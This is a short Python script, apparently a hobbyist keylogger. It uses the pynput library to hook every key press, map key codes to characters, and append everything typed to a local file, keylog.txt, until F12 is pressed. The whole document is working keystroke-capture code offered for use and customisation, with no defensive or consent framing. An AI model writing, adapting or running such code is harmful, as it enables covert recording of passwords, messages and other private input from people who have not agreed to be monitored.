# Self-explanatory.
KEYLOG_FILENAME = "keylog.txt"

# Conversion of command names to characters. Customize this to your liking.
CONVERSION_TABLE = {
    "[SPACE]": " ",
    "[SHIFT]": "",
    "[SHIFT_R]": "",
    "[CTRL_L]": "",
    "[CTRL_R]": "",
    "[ALT_L]": "",
    "[ALT_R]": "",
    "[ALT_GR]": "",
    "[96]": "0",
    "[97]": "1",
    "[98]": "2",
    "[99]": "3",
    "[100]": "4",
    "[101]": "5",
    "[102]": "6",
    "[103]": "7",
    "[104]": "8",
    "[105]": "9",
    "[106]": "*",
    "[107]": "+",
    "[108]": ",",
    "[109]": "-",
    "[110]": ".",
    "[111]": "/",
    "[F12]": "[EXIT]", # Exit key
}

from pynput import keyboard
from sys import exit

# Writes a key press to the keylog file
def write_key(key):
    letter = key2letter(key)

    if (letter in CONVERSION_TABLE):
        letter = CONVERSION_TABLE[letter]

    with open(KEYLOG_FILENAME, "a+") as f:
        f.write(letter)

    if (letter == "[EXIT]"):
        exit()

# Converts key presses to letters or key names
def key2letter(key):
    # Is a numpad key (weird behavior with these)
    if (hasattr(key, "vk") and key.vk >= 96 and key.vk <= 111):
        return "[" + str(key.vk) + "]"

    # Is a letter
    elif (hasattr(key, "char") and key.char != None):
        if (len(str(key)[1:-1]) == 4): # CTRL
            return "[CTRL^" + str(chr(key.vk)) + "]"
        else: # No CTRL
            return str(key.char)

    # Is a command
    elif (hasattr(key, "name")):
        return "[" + str(key.name).upper() + "]"

    # Is anything else (fallback)
    else:
        return "[" + str(key) + "]"

# Listens for key presses
with keyboard.Listener(on_press=write_key) as lis: 
    lis.join()